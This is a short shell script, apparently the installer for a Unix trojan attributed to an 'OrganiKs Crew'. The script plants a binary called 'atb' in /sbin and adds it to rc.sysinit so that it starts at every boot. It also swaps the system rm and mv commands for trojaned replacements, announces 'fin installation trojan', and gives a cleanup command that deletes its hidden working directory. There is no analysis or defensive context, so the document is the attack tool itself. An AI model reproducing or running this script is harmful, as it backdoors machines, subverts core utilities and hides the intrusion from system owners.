#!/bin/sh
#Install 
# OrganiKs Crew (Lionel)
/bin/mv atb /sbin/atb
/bin/echo "/sbin/atb" >>  /etc/rc.d/rc.sysinit
/bin/rm -f /etc/rc.d/rc.sysinit~
/bin/chmod +x /sbin/atb
/bin/mv /bin/rm /bin/rm.old
/bin/mv rm /bin/rm
/bin/mv /bin/mv /bin/mv.old
/bin/mv.old mv /bin/mv
/bin/chmod +x /bin/rm
/bin/chmod +x /bin/mv
echo "fin installation trojan"
echo "cd ..;rm -rf .bkr"

